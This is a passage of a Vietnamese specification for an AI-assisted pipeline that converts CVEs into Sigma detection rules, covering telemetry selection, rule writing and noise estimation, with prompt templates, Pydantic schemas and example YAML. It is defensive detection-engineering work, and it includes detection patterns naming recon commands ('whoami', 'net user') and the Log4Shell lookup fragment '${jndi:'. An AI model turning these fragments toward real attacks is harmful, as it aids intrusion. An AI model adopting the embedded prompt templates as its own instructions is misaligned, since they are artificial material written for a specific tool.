→ Map sang field thật của từng SIEM là **việc của pipeline khi convert**, KHÔNG nhồi vào rule.

### 5.3. Verify telemetry & document yêu cầu

- **Verify**: dấu vết bạn định bắt có thực sự được log không? (vd `process_creation` cần Sysmon EID 1 với config bắt được parent-child; `image_load` cần EID 7 — thường tắt mặc định vì ồn).
- **Document cho consumer**: ghi rõ logsource + EID + Sysmon config cần thiết để rule chạy được. Tham khảo [Sysmon config mẫu](https://github.com/SwiftOnSecurity/sysmon-config).

> [!IMPORTANT] "Không log thì không detect được"
> Nếu hành vi không nằm trong telemetry phổ biến, rule sẽ "chết câm" ở phần lớn người dùng. Cân nhắc đổi trục phát hiện hoặc ghi rõ yêu cầu telemetry đặc biệt.

### 5.4. Khi nào cần Correlation
Nếu một sự kiện đơn lẻ chưa đủ kết luận (cần *đếm*, *ngưỡng*, *chuỗi sự kiện theo thứ tự*) → dùng **Sigma Correlation rule** (xem [§7.6](#76-correlation-rules-logic-đa-sự-kiện)) thay vì viết logic tương quan trực tiếp bằng EQL/SPL (sẽ phá portability).

### 5.5. AI Prompt (system + user) — verbatim đặt trong `app/services/ai/prompts/select_telemetry.txt`

**System prompt:**

```text
You are a detection engineer with deep Sigma rule expertise.
Recommend telemetry sources and Sigma logsource categories for a given CVE's exploitation behavior.

Principles:
1. Prioritize POST-EXPLOITATION over pre-exploitation (more durable).
2. Use EXACT Sigma logsource categories from the reference table — do not invent new ones.
3. Consider telemetry availability — flag rules requiring rare EIDs (e.g. image_load/EID 7) as gaps.
4. Identify gaps preventing detection; mark gap_severity as "low" | "medium" | "high".
5. Required fields MUST be valid fields for the chosen logsource category (taxonomy enforcement).
   Validation is done post-hoc by taxonomy_validator; invalid fields will be dropped + logged.

## Reference — logsource category → field taxonomy
{TABLE_FROM_5.2}

## Reference — fallback axis_map (rule-based)
{AXIS_MAP_FROM_telemetry_selector.py}
```

**User prompt:**

```text
Recommend telemetry for this CVE's detection:

**CVE ID**: {cve_id}
**Vulnerability class**: {vulnerability_class}
**Mandatory behaviors** (from Bước 2): {mandatory_behaviors}
**Optional behaviors**: {optional_behaviors}
**ATT&CK tactics**: {tactics}
**ATT&CK techniques**: {techniques}
**ATT&CK subtechniques**: {subtechniques}
**Attack flow**:
  - entry_vector: {attack_flow.entry_vector}
  - execution_mechanism: {attack_flow.execution_mechanism}
  - observable_side_effects: {attack_flow.observable_side_effects}

Return a JSON object with EXACTLY these keys:
{
  "detection_axis": ["pre-exploit", "post-exploit", "impact"],
  "primary_axis": "post-exploit",
  "sigma_logsources": [
    {"category": "process_creation", "product": "windows", "service": null}
  ],
  "required_fields": ["ParentImage", "Image", "CommandLine"],
  "recommended_fields": ["User", "IntegrityLevel"],
  "sysmon_eids": [1],
  "telemetry_requirements": "Sysmon EID 1 with parent-child image loading enabled",
  "telemetry_gaps": ["image_load requires EID 7 which is noisy and often disabled"],
  "gap_severity": "medium",
  "telemetry_feasibility_score": 0.0-1.0,
  "detection_strategy": ["select post-exploit axis first", "add impact axis if EID 3 enabled"],
  "correlation_required": false,
  "field_taxonomy_notes": ["process_creation does not use cs-uri-query"],
  "telemetry_confidence": 0.0-1.0
}
```

### 5.6. Output Bước 4 — schema model (verbatim từ code)

**File**: `app/models/telemetry.py`

```python
class SigmaLogsource(BaseModel):
    category: str
    product: str
    service: str | None = None


class TelemetryRequirements(BaseModel):
    required_event_ids: list[str] | None = None


class TelemetryAssessment(BaseModel):
    detection_axis: list[str] | None = None
    candidate_logsources: list[str] | None = None
    sigma_logsources: list[SigmaLogsource] | None = None
    telemetry_requirements: TelemetryRequirements | None = None
    pre_exploit_detection: list[str] | None = None
    post_exploit_detection: list[str] | None = None
    impact_detection: list[str] | None = None
    telemetry_feasibility_score: float | None = None
    detection_strategy: list[str] | None = None
    required_events: list[str] | None = None
    required_fields: list[str] | None = None
    telemetry_confidence: float | None = None
    correlation_required: bool | None = None
    field_taxonomy_notes: list[str] | None = None
    validated_fields: list[str] | None = None
    invalid_fields: list[str] | None = None
    taxonomy_warnings: list[str] | None = None
```

### 5.7. Nguồn dữ liệu để AI so sánh / sàng lọc

| # | Nguồn | Cách dùng |
|---|---|---|
| 1 | Bảng `category` → field taxonomy (mục 5.2) | Embed trong system prompt |
| 2 | `app/telemetry/telemetry_selector.py::axis_map` (8 entries) | Embed trong system prompt làm "fallback reference" |
| 3 | Sigma taxonomy appendix chính thức | URL trong prompt + validate hậu kiểm |
| 4 | Sysmon config mẫu `SwiftOnSecurity/sysmon-config` | Để AI biết EID nào thực tế bật được; dùng làm `telemetry_requirements` |
| 5 | `app/telemetry/taxonomy_validator.py` | Validate field sau khi AI sinh ra — invalid → đẩy vào `taxonomy_warnings` |
| 6 | `app/telemetry/logsource_mapper.py` + `app/telemetry/field_mapper.py` | Map `candidate_logsources` → `sigma_logsources` đúng schema |
| 7 | `app/telemetry/correlation_advisor.py` | Đánh dấu `correlation_required: true` nếu ≥1 axis cần correlation |

### 5.8. Fallback (khi AI fail / taxonomy validator phát hiện field không hợp lệ)

| Hàm | File | Trả về |
|---|---|---|
| `select_detection_axis()` | `app/telemetry/telemetry_selector.py:4` | `(axes, confidence)` |
| `logsource_mapper.map()` | `app/telemetry/logsource_mapper.py` | `list[SigmaLogsource]` |
| `field_mapper.map()` | `app/telemetry/field_mapper.py` | `list[str]` field hợp lệ |
| `taxonomy_validator.validate()` | `app/telemetry/taxonomy_validator.py` | `(validated, invalid, warnings)` |

Khi fallback chạy, set `telemetry.ai_used = False` (propagation lên `EnrichedCVEContext`).

### 5.9. Service Interface — `app/services/ai/telemetry_selector.py`

```python
class AITelemetrySelector:
    def __init__(
        self,
        anthropic_client: Anthropic,
        fallback_selector: TelemetrySelector,
        taxonomy_validator: TaxonomyValidator,
    ):
        self.client = anthropic_client
        self.fallback = fallback_selector
        self.validator = taxonomy_validator

    async def select(
        self,
        analysis: TechnicalAnalysis,
        attack: AttackMapping,
    ) -> TelemetryAssessment:
        try:
            ai_result = await self._ai_select(analysis, attack)
            validated = self.validator.validate(ai_result)
            return validated
        except (AIServiceError, ValidationError, json.JSONDecodeError):
            logger.warning("AI telemetry select failed, using rule-based fallback")
            return self.fallback.select(analysis, attack)
```

### 5.10. Output Bước 4 (tóm tắt)

- `TelemetryAssessment` instance với ≥1 `sigma_logsources`, ≥1 `required_fields`, `telemetry_gaps` đã list rõ.
- `correlation_required` flag đã set.
- `telemetry_confidence` (0-1) — nếu <0.5 → cân nhắc NO-GO ở Bước 1 hoặc ghi rõ rủi ro.

---

## 6. ~~Bước 5 — Lab: Tái Hiện & Thu Thập Dữ Liệu~~ (BỎ)

> [!IMPORTANT] Tại sao bỏ Bước 5?
> Trong quy trình cộng đồng open-source này, **không yêu cầu dựng lab cô lập** vì:
> 1. Tốn kém (VM/Sysmon/Collectors) và **rủi ro an toàn** nếu chạy PoC mà không cô lập đúng cách.
> 2. Phần lớn CVE phổ biến đã có sẵn public dataset (xem dưới) — không cần tự dựng.
> 3. Detection engineer cộng đồng thường không có lab sẵn.
> 4. Dữ liệu positive/negative dùng cho validate (nếu có Bước 8) có thể lấy từ dataset thay vì tự dựng.

> [!TIP] Phân tầng nguồn dữ liệu (ưu tiên reuse trước khi tự dựng)
> | Ưu tiên | Nguồn | Khi nào dùng |
> |---|---|---|
> | 1 | **Public dataset** ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [Splunk BOTS](https://github.com/splunk/botsv3), [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)) | Hành vi/TTP đã có sample sẵn (Log4Shell, Mimikatz, PrintNightmare…) |
> | 2 | **Vulhub container** ([vulhub/vulhub](https://github.com/vulhub/vulhub)) | ~400 CVE đã được đóng gói Docker — RCE web/app |
> | 3 | **Lab tự dựng** (cô lập: target + attacker + collectors + pcap) | CVE mới, chưa có dataset/container — **ngoài scope spec này** |
> | 4 | **No-lab path** (analyse PoC + analogy từ rule có sẵn) | Không thể dựng được — giảm `self_confidence`, đánh dấu `low-confidence` tag trong description |

> [!NOTE] Nếu rule cần smoke-test mà không có dataset, tham khảo [§11.4](#114-checklist-phân-tích--telemetry-bước-2--4) mục "test fire" — chạy rule trên log local thật + log từ public dataset là đủ.

---

## 7. Bước 6 — Viết Sigma Rule (AI)

**Mục tiêu**: diễn đạt logic phát hiện thành Sigma rule đạt **convention SigmaHQ** + **portable**.

> [!IMPORTANT] Bước 6 dùng **AI làm primary**, fallback về `DetectionTemplateBuilder` + `DetectionTemplate` abstract trong `app/sigma_generator/family_detection/`.

### 7.1. Giải phẫu rule — required vs optional

| Bắt buộc | Tuỳ chọn |
|---|---|
| `title`, `id`, `status`, `description`, `references`, `author`, `date`, `tags`, `logsource`, `detection` (+`condition`), `falsepositives`, `level` | `related`, `modified`, `fields` |

> SigmaHQ **chặt hơn** Sigma spec gốc: `references`, `author`, `date`, `tags`, `falsepositives`, `level` đều bắt buộc.

### 7.2. Từng field — quy tắc chính xác

| Field | Quy tắc |
|---|---|
| `title` | **Title Case**, ngắn gọn mô tả hành vi (vd "Suspicious Office Child Process") |
| `id` | UUID v4 **duy nhất** (sinh bằng `uuidgen`); không bao giờ trùng/tái dùng |
| `status` | Rule mới luôn bắt đầu `experimental` (vòng đời ở [§7.2.1](#721-vòng-đời-status)) |
| `description` | Bắt đầu bằng **"Detects …"**; multiline dùng `\|` |
| `references` | Public + **permalink** (không link branch dễ đổi); **KHÔNG** để link MITRE ATT&CK ở đây |
| `author` | Tên cá nhân/tổ chức |
| `date` / `modified` | **ISO 8601 `YYYY-MM-DD`** (gạch nối), vd `2026-06-05` |
| `tags` | `attack.<tactic>` (vd `attack.initial_access`), `attack.t####[.###]` (kèm sub-technique), `cve.YYYY.NNNN` (dấu chấm) |
| `logsource` | `category`/`product`/`service` — field phải theo taxonomy của logsource này |
| `fields` | (tuỳ chọn) field gợi ý hiển thị khi điều tra |
| `falsepositives` | Nêu rõ; "Unknown"/"Unlikely" khi chưa rõ; **CẤM** "None", "Pentest", "Red Team" |
| `level` | 5 mức ngữ nghĩa — [§7.2.2](#722-level--ngữ-nghĩa-không-map-số) — có thể hiệu chỉnh ở Bước 7 (noise) |
| `related` | Đã quyết định ở Bước 3 (Coverage Analysis); copy vào đây |

#### 7.2.1. Vòng đời `status`
`experimental` (mới tạo) → `test` (sau vài tháng dùng thực, không bị phản hồi xấu) → `stable` (~1 năm, không sửa lớn ngoài filter). Rule lỗi thời: `deprecated`; không còn convert được: `unsupported`.

#### 7.2.2. `level` — ngữ nghĩa (KHÔNG map số)

> [!WARNING] Không map `level` ra điểm số
> `level` chỉ mang **ngữ nghĩa** — đừng gán sẵn severity/risk_score (vd 21/47/73/99) vì mỗi SIEM một thang điểm. **Consumer tự map**.

| `level` | Ngữ nghĩa |
|---|---|
| `informational` | Sự kiện ghi nhận/ngữ cảnh, không nhất thiết độc hại (hợp hunting) |
| `low` | Đáng lưu ý, ít khẩn |
| `medium` | Khả nghi, nên điều tra |
| `high` | Nhiều khả năng độc hại, ưu tiên cao |
| `critical` | Gần như chắc chắn độc hại / tác động nghiêm trọng |

### 7.3. Detection block & bảng modifier đầy đủ

`detection` gồm các **search-identifier** (mỗi cái là một *map* field→value, hoặc một *list* keyword) + một `condition` kết hợp chúng.

```yaml
detection:
  selection:                 # map: AND giữa các field, OR trong list value
    Image|endswith: '\cmd.exe'
    CommandLine|contains:
      - 'whoami'
      - 'net user'           # list ⇒ OR (trừ khi thêm |all)
  filter:
    User|contains: 'admin'
  condition: selection and not filter
```

**Value modifier** (gắn sau field bằng `|`, **chain được, áp dụng theo thứ tự**):

| Nhóm | Modifier | Ý nghĩa |
|---|---|---|
| Transformation (backend-agnostic) | `contains` | chuỗi con (tự bọc `*value*`) |
| | `startswith` / `endswith` | tiền/hậu tố |
| | `all` | đổi list từ OR → **AND** (mọi value phải khớp) |
| | `base64` / `base64offset` | match chuỗi đã encode base64 (`offset` xử lý 3 vị trí lệch byte) |
| | `utf16le` / `utf16be` / `utf16` / `wide` | encode Unicode trước khi match (`wide` = alias `utf16le`; `utf16` = UTF-16LE có BOM) |
| | `windash` | biến thể dấu gạch tham số CLI (`-`/`/`/`–`/`—`) |
| | `expand` | xử lý placeholder `%name%` (đặt giá trị lúc convert qua pipeline) |
| | `cased` | ép phân biệt hoa/thường (mặc định Sigma match không phân biệt) |
| Type (backend-dependent) | `re` | regex (flags: `i` không phân biệt hoa thường, `m` multiline, `s` dotall) |
| | `cidr` | match dải IP theo CIDR |
| | `lt` / `lte` / `gt` / `gte` | so sánh số |
| | `fieldref` | so sánh giá trị field này == field khác |
| | `exists` | field có tồn tại hay không (`true`/`false`) |

> Chuỗi thường hỗ trợ wildcard `*` (nhiều ký tự) và `?` (một ký tự). Ví dụ chain: `CommandLine|base64offset|contains` (giải mã base64 rồi tìm chuỗi con).

### 7.4. Condition syntax

- **Toán tử logic**: `and`, `or`, `not`, gom nhóm bằng `()`.
- **Lượng từ**: `1 of them`, `all of them` (hạn chế dùng), `x of them`; **theo wildcard**: `1 of selection_*`, `all of selection_*` (ưu tiên hơn `all of them`).
- **Độ ưu tiên (thấp → cao)**: `or` < `and` < `not` < `x of` < `()`.

```text
# Ví dụ thực dụng:
1 of selection_* and not 1 of filter_*
selection and (keywords_a or keywords_b) and not filter_legit
```

### 7.5. Design patterns
- **selection + filter**: tách điều kiện bắt và điều kiện loại trừ FP (`condition: selection and not filter`).
- **Null/`exists`**: bắt trường hợp field vắng mặt (`Field|exists: false`).
- **`fieldref`**: bắt bất thường khi hai field nên/không nên bằng nhau.
- **Tránh over-fit**: đừng khoá 1 IP/domain/chuỗi literal nếu bắt được theo *hành vi*.

### 7.6. Correlation rules (logic đa sự kiện)

Khi cần *đếm*, *ngưỡng*, hoặc *chuỗi sự kiện* — viết **Correlation rule** (vendor-agnostic). Tham chiếu rule con qua `name` hoặc `id`.

**7 loại** ([spec](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-correlation-rules-specification.md)):

| `type` | Dùng để |
|---|---|
| `event_count` | Đếm số sự kiện trong `timespan` (vd brute force) |
| `value_count` | Đếm số *giá trị phân biệt* của một field |
| `temporal` | Nhiều rule cùng xảy ra trong `timespan` (thứ tự không quan trọng) |
| `temporal_ordered` | Như `temporal` nhưng **đúng thứ tự** khai báo |
| `value_sum` / `value_avg` / `value_percentile` | Tổng/trung bình/percentile của field số *(mới — không phải backend nào cũng convert; kiểm tra trước khi dùng)* |

Cấu trúc: `type` · `rules` (id/name rule con) · `group-by` (lưu ý **gạch nối**) · `timespan` (`[số][s|m|h|d]`) · `condition` (`gt`/`gte`/`lt`/`lte`/`eq`/`neq`, kèm `field` cho các loại `value_*`) · `aliases` (map tên field khác nhau giữa các rule con).

```yaml
# event_count: ≥5 lần một rule fire từ cùng nguồn trong 10 phút
title: Multiple Probes From Single Source
status: experimental
correlation:
  type: event_count
  rules:
    - web_probe_rule        # name của rule con
  group-by:
    - c-ip
  timespan: 10m
  condition:
    gte: 5
```

```yaml
# temporal_ordered: rule A rồi tới rule B trong 5 phút, cùng host
correlation:
  type: temporal_ordered
  rules:
    - rule_a_name
    - rule_b_name
  group-by:
    - host                  # cần field chung; dùng aliases nếu tên khác nhau
  timespan: 5m
```

### 7.7. Filename convention

Pattern `[prefix]_[descriptor].yml` — **lowercase + underscore**.

| Prefix | Dùng cho |
|---|---|
| `proc_creation_win_` / `proc_creation_lnx_` | process creation |
| `web_` | webserver / proxy |
| `net_connection_win_`, `net_dns_` | network / DNS |
| `file_event_win_`, `file_delete_win_` | file ops |
| `registry_set_`, `registry_add_` | registry |
| `image_load_`, `pipe_created_` | OS-agnostic |
| `lnx_<service>_`, `win_<service>_` | service-based (auditd, sshd, security…) |

### 7.8. AI Prompt (system + user) — verbatim đặt trong `app/services/ai/prompts/write_sigma_rule.txt`

**System prompt:**

```text
You are a detection engineer specializing in Sigma rules. Write COMPLETE, VALID Sigma rules
following SigmaHQ convention. The output is a YAML file.

Hard rules:
1. `title` MUST be Title Case.
2. `id` MUST be a freshly generated UUID v4 (we validate uniqueness post-hoc).
3. ALL required metadata fields MUST be present: title, id, status, description,
   references, author, date, tags, logsource, detection, condition, falsepositives, level.
4. Field names MUST follow Sigma taxonomy for the chosen logsource category.
   Do NOT use ECS/SPL/KQL-specific fields.
5. Detection logic MUST be precise but avoid over-fitting (no single IP/domain unless
   the rule is explicitly IOC-based).
6. `falsepositives` MUST be realistic and specific. NEVER use the strings
   "None", "Pentest", or "Red Team" — these are explicitly forbidden.
7. `level` MUST be one of: informational, low, medium, high, critical.
   Start with the severity inferred from CVSS + behavior; Bước 7 will adjust based on noise.
8. Add a noise/complexity note at the END of description block (will be filled in Bước 7):
   `Estimated noise: <placeholder> | Complexity: <placeholder>`.
9. Use ISO date YYYY-MM-DD for `date`.
10. If Bước 3 returned a `related` block, copy it verbatim into `metadata.related`.

## Reference — rule anatomy (required vs optional)
{TABLE_FROM_7.1}

## Reference — value modifier table
{TABLE_FROM_7.3}

## Reference — condition syntax
{TEXT_FROM_7.4}

## Reference — correlation types
{TABLE_FROM_7.6}

## Reference — filename prefix
{TABLE_FROM_7.7}

## Few-shot examples (one per common logsource)
{FEWSHOT_LOG4SHELL_RULE_A_AND_B_FROM_BASE_DOC}
```

**User prompt:**

```text
Write a Sigma rule for:

**CVE ID**: {cve_id}
**Vulnerability type**: {vulnerability_type}
**ATT&CK**: tactics={tactics}, techniques={techniques}, subtechniques={subtechniques}
**Behaviors** (mandatory): {mandatory_behaviors}
**Telemetry**: logsource={sigma_logsources}, required_fields={required_fields}
**Correlation required**: {correlation_required}
**Coverage decision**: {coverage.decision}
**Related block** (from Bước 3, may be null):
{coverage.related_rules}

Output a COMPLETE YAML rule body, starting from `title:` and including all required fields.
Do not include any prose before or after the YAML.
```

### 7.9. Output Bước 6 — schema model (verbatim từ code)

**File**: `app/sigma_generator/models/sigma_rule.py::SigmaRule`

```python
class SigmaRule(BaseModel):
    metadata: SigmaMetadata
    logsource: dict[str, str] = Field(default_factory=dict)
    detection: SigmaDetection
    x_family: str | None = None
    x_signature: str | None = None
    x_detection_confidence: float | None = None
    x_correlation_required: bool | None = None
    x_correlation_logic: bool | None = None
    x_correlation_reasoning: str | None = None
    x_sigma_quality_score: int | None = None
    x_sigma_quality_grade: str | None = None
    x_sigma_validation_passed: bool | None = None
    x_quality_score: int | None = None
    x_signal_quality: str | None = None
    x_false_positive_rate: str | None = None
    x_complexity_class: str | None = None
    x_deployment_readiness: str | None = None
    x_maintenance_cost: str | None = None
    x_secondary_logsources: list[str] = Field(default_factory=list)
```

**File**: `app/sigma_generator/models/sigma_metadata.py::SigmaMetadata`

```python
class SigmaMetadata(BaseModel):
    title: str
    id: str
    status: str
    description: str
    references: list[str] = Field(default_factory=list)
    author: str | None = None
    date: str | None = None
    tags: list[str] = Field(default_factory=list)
    falsepositives: list[str] = Field(default_factory=list)
    level: str = "medium"
    related: list[dict[str, str]] = Field(default_factory=list)
```

**File**: `app/sigma_generator/models/sigma_detection.py::SigmaDetection`

```python
class SigmaDetection(BaseModel):
    selections: dict[str, dict[str, list[str]]] = Field(default_factory=dict)
    condition: str = "1 of selection_*"
```

### 7.10. Nguồn dữ liệu để AI so sánh / sàng lọc

| # | Nguồn | Cách dùng |
|---|---|---|
| 1 | SigmaHQ rule convention (bảng §7.1) | Embed trong system prompt |
| 2 | Rule anatomy §7.2 | Embed trong system prompt |
| 3 | Value modifier table §7.3 | Embed trong system prompt |
| 4 | Condition syntax §7.4 | Embed trong system prompt |
| 5 | Correlation types §7.6 | Embed trong system prompt |
| 6 | Filename prefix §7.7 | Embed trong system prompt |
| 7 | Log4Shell Rule A + Rule B (few-shot từ `CVE-2-Sigma.md` §10) | Embed trong system prompt — AI học pattern |
| 8 | `app/sigma_generator/family_detection/base.py::DetectionTemplate` (abstract) | Fallback reference cho từng family |
| 9 | `app/sigma_generator/family_detection/registry.py` | List các family có template (`web_log4shell`, `spring4shell`, `proc_creation_java_child`, …) |
| 10 | `app/sigma_generator/serializers/yaml_serializer.py` | Serialize → YAML cuối cùng |

### 7.11. Fallback (khi AI fail / YAML parse lỗi / UUID trùng)

| Hàm | File | Trả về |
|---|---|---|
| `DetectionTemplateBuilder.build()` | `app/sigma_generator/family_detection/builder.py` | `SigmaDetection` cho family đã biết |
| `SigmaYamlSerializer.serialize()` | `app/sigma_generator/serializers/yaml_serializer.py` | `str` YAML |

Khi fallback chạy, set `x_ai_used = False` trong `SigmaRule` (propagation lên `EnrichedCVEContext.detections`).

### 7.12. Service Interface — `app/services/ai/rule_writer.py`

```python
class AISigmaRuleWriter:
    def __init__(
        self,
        anthropic_client: Anthropic,
        fallback_builder: DetectionTemplateBuilder,
        yaml_serializer: SigmaYamlSerializer,
    ):
        self.client = anthropic_client
        self.fallback = fallback_builder
        self.serializer = yaml_serializer

    async def write_rule(
        self,
        cve_id: str,
        analysis: TechnicalAnalysis,
        attack: AttackMapping,
        telemetry: TelemetryAssessment,
        coverage: CoverageAssessment,
    ) -> SigmaRule:
        try:
            yaml_text = await self._ai_write_yaml(...)
            rule = self._parse_yaml_to_rule(yaml_text)
            self._validate_uuid_unique(rule.metadata.id)
            return rule
        except (AIServiceError, ValidationError, yaml.YAMLError, DuplicateUUIDError):
            logger.warning("AI rule writer failed, using DetectionTemplate fallback")
            return self.fallback.build(analysis, attack, telemetry, coverage)
```

### 7.13. Dựng rule từ dữ liệu (mini-process)

1. Lấy field + value từ `TelemetryAssessment.required_fields` + `analysis.attack_flow.observable_side_effects`.
2. Chọn `logsource.category` từ `telemetry.sigma_logsources[0]` → tra field taxonomy (mục 5.2).
3. Viết `selection` từ indicator **bền** nhất; thêm `filter` cho FP (nếu Bước 7 đã gợi ý).
4. Viết `condition` theo §7.4.
5. Điền metadata theo §7.2 + `related` (từ Bước 3 nếu có); đặt tên file theo §7.7.
6. Mỗi trục phát hiện → **một rule riêng** (đừng gộp web + process vào một rule).

---

## 8. Bước 7 — Noise Estimation & Complexity Budget (AI)

**Mục tiêu**: ước lượng *bao nhiêu alert/ngày* rule sẽ tạo trên môi trường tham chiếu và *độ phức tạp truy vấn* — *trước khi* rule phát hành. Một rule đúng logic nhưng tạo 10k alert/ngày là rule **chết** ngay khi triển khai.

> [!IMPORTANT] Bước 7 dùng **AI làm primary**, fallback về `conservative_estimate()` (medium / 100-1k / medium / consider_downgrade).
> Spec này mô tả **2 mode** để user chọn sau:
> - **Mode A (AI-only)**: AI suy luận từ detection logic + logsource dựa trên bảng noise factors dưới đây.
> - **Mode B (AI + GreyNoise)**: nếu rule có IOC literal (IP/domain), gọi thêm [GreyNoise Community API](https://greynoise.io) để check IP background noise.

### 8.1. Hai metric đầu ra

```yaml
# Đặt làm metadata (annotation) — không phải field Sigma bắt buộc, nhưng
# rất hữu ích cho consumer khi quyết định triển khai
fields:
  - estimated_events_per_day      # tham khảo trong description hoặc comment
  - complexity_class
```

| Metric | Giá trị | Ý nghĩa |
|---|---|---|
| **`estimated_events_per_day`** | `low` (<100) / `medium` (100-1k) / `high` (1k-10k) / `very_high` (>10k) | Số alert dự kiến trên môi trường tham chiếu (enterprise ~10k endpoint + web tier điển hình) |
| **`complexity_class`** | `low` / `medium` / `high` | Chi phí query trên SIEM phổ biến |

### 8.2. Estimate alert rate (qualitative)

Không cần con số chính xác — *bậc của 10* là đủ.

Yếu tố ảnh hưởng:

| Yếu tố | Tác động noise |
|---|---|
| `process_creation` mọi process Windows | Baseline rất cao (~M/ngày trên 10k endpoint) → cần filter mạnh |
| `webserver` với chuỗi rare trong URI/UA (vd `${jndi:`) | Thấp ngoài attack burst |
| `network_connection` với port phổ biến (80/443) | Cao — cần thêm điều kiện |
| `network_connection` với port hiếm (1389/389 LDAP) | Thấp ngoài enterprise có LDAP |
| `dns_query` cho TLD/SLD phổ biến | Cao |
| `image_load` của DLL hệ thống | Cực cao (M/ngày), thường bỏ |
| `file_event` trong webroot | Thấp tại baseline, cao khi attack |
| Filter strictness | Mỗi `and not filter` giảm 1-2 bậc |
| Selector cụ thể (literal vs wildcard) | Literal → thấp, `*` rộng → cao |

**Quy tắc thực dụng**:
1. Nếu selection bắt event ở baseline phổ biến (vd mọi `process_creation`) → noise cao trừ khi có filter mạnh.
2. Nếu selection có ≥2 điều kiện AND specific (parent + child + commandline) → noise thường thấp.
3. Nếu chỉ 1 điều kiện literal (vd 1 string trong URI) → estimate dựa trên baseline traffic.

### 8.3. Đo complexity (qualitative)

| Class | Đặc trưng | Hậu quả |
|---|---|---|
| **`low`** | Field equality / `endswith` / `startswith` / list nhỏ | Mọi SIEM chạy nhanh |
| **`medium`** | `contains` trên field thường, 2-3 selection AND, regex đơn giản (anchor đầu/cuối) | OK trên Splunk/Elastic; chậm hơn trên QRadar/Sentinel |
| **`high`** | Regex unbounded (`[^}]*`, `.*` không giới hạn), keyword search toàn event, `|all` trên list lớn, lookups | Sentinel/QRadar có thể chặn hoặc throttle |

> [!TIP] Quy tắc viết regex thân thiện SIEM
> - **Giới hạn quantifier**: `{0,40}` thay vì `*` không giới hạn.
> - **Anchor**: `^` / `$` khi có thể.
> - **Tránh backtrack catastrophic**: không dùng `(a|b)*c` mơ hồ.
> - **Nếu cần regex phức tạp**: cân nhắc tách thành nhiều rule đơn giản + Correlation, thay vì 1 regex monster.

### 8.4. Cross-platform: GreyNoise + IOC suppression (Mode B)

> [!NOTE] Đây là phần **tuỳ chọn** (Mode B) — chỉ dùng khi `GREYNOISE_API_KEY` được set trong env.

Cho rule IOC-based (IP/domain):
- Check [GreyNoise](https://greynoise.io) — bao nhiêu IP nguồn là "Internet background noise"?
- Nếu IOC là IP/domain phổ biến trong noise → đổi sang behavioural selection thay vì IOC literal.

```python
# Pseudo-flow Mode B
async def estimate_with_greynoise(rule: SigmaRule) -> NoiseEstimate:
    iocs = extract_iocs(rule)  # IP/domain literal
    if not iocs:
        return await ai_estimate_only(rule)
    greynoise_context = await greynoise.lookup_many(iocs)
    return await ai_estimate_with_context(rule, greynoise_context)
```

### 8.5. AI Prompt (system + user) — verbatim đặt trong `app/services/ai/prompts/estimate_noise.txt`

**System prompt:**

```text
You are a detection engineer analyzing Sigma rule noise and complexity.

Reference environment:
- 10,000 Windows endpoints (process_creation baseline ~M events/day)
- Web tier with average traffic (webserver baseline ~100k requests/day)
- Sysmon EID 1 enabled by default; EID 7 (image_load) is OPTIONAL and often disabled
- Splunk / Elastic EQL / Sentinel KQL are the primary SIEM targets

## Reference — noise factors per logsource
{TABLE_FROM_8.2}

## Reference — complexity classes
{TABLE_FROM_8.3}

## Reference — level adjustment matrix
{TABLE_FROM_8.5_INVERTED}

Estimate orders of magnitude (low <100, medium 100-1k, high 1k-10k, very_high >10k)
based on the rule's selection strictness + logsource baseline. Do not produce exact counts.

## Optional context (Mode B)
{GREYNOISE_CONTEXT_IF_AVAILABLE}
```

**User prompt:**

```text
Estimate noise + complexity for this Sigma rule:

**Title**: {rule.metadata.title}
**Logsource**: {rule.logsource}
**Detection YAML**:
```yaml
{rule.detection_yaml}
```

**Falsepositives declared**: {rule.metadata.falsepositives}

**IOCs detected in selection**: {extracted_iocs_or_empty}

Return a JSON object with EXACTLY these keys:
{
  "events_per_day": "low|medium|high|very_high",
  "estimated_count": "<100|100-1k|1k-10k|>10k",
  "complexity_class": "low|medium|high",
  "noise_factors": ["factor1", "factor2", ...],
  "likely_false_positives": ["fp1", "fp2", ...],
  "recommended_filters": ["filter1", "filter2", ...],
  "level_adjustment": "downgrade from critical to high" | "downgrade from high to medium" | null,
  "reasoning": "<one paragraph explanation>",
  "confidence": 0.0-1.0
}
```

### 8.6. Output Bước 7 — schema model (mới, sẽ tạo tại `app/sigma_validation/noise_models.py`)

```python
class NoiseEstimate(BaseModel):
    events_per_day: str            # "low" | "medium" | "high" | "very_high"
    estimated_count: str           # "<100" | "100-1k" | "1k-10k" | ">10k"
    complexity_class: str          # "low" | "medium" | "high"

    noise_factors: list[str]
    likely_false_positives: list[str]
    recommended_filters: list[str]

    level_adjustment: str | None   # "downgrade from critical to high" | ... | null
    reasoning: str

    confidence: float
    ai_used: bool = False
```

### 8.7. Nguồn dữ liệu để AI so sánh / sàng lọc

| # | Nguồn | Cách dùng |
|---|---|---|
| 1 | Bảng noise factors §8.2 | Embed trong system prompt |
| 2 | Bảng complexity class §8.3 | Embed trong system prompt |
| 3 | Bảng level adjustment §8.5 (mục 8.5 dưới đây) | Embed trong system prompt |
| 4 | Quy tắc regex thân thiện SIEM §8.3 TIP | Embed trong system prompt |
| 5 | GreyNoise Community API (Mode B, optional) | Lookup IP literal trong selection; đưa `classification` (benign/malicious/unknown) + `noise` vào prompt context |
| 6 | `app/sigma_validation/quality_scorer.py` | Validate output — đảm bảo enum values hợp lệ |
| 7 | `app/sigma_validation/validator.py` | L1+L2 sanity check (UUID, schema) |

### 8.8. Điều chỉnh `level` theo noise

Sau khi estimate, có thể downgrade `level`:

| Estimate | Logic ban đầu | Khuyến nghị |
|---|---|---|
| `low` noise + `critical` logic | `critical` | Giữ `critical` |
| `medium` noise + `critical` logic | Vẫn `critical` nếu bắt được hành vi rất cụ thể | Hoặc thêm `filter` để hạ về `low` noise rồi giữ `critical` |
| `high` noise + bất kỳ logic nào | — | **Đừng dùng `critical`/`high`** — set `medium` hoặc `informational` (hunting) cho đến khi siết được filter |
| `very_high` noise | — | Không phát hành — quay lại Bước 6 (selector bền) hoặc đổi trục Bước 4 |

### 8.9. Document trong description hoặc PR

Vì noise/complexity không phải field Sigma chính thức, AI chèn vào description:

```yaml
description: |
    Detects ...

    Estimated noise: low (<100 alerts/day on a 10k-endpoint reference environment).
    Complexity: low (single endswith on Image + ParentImage).
```

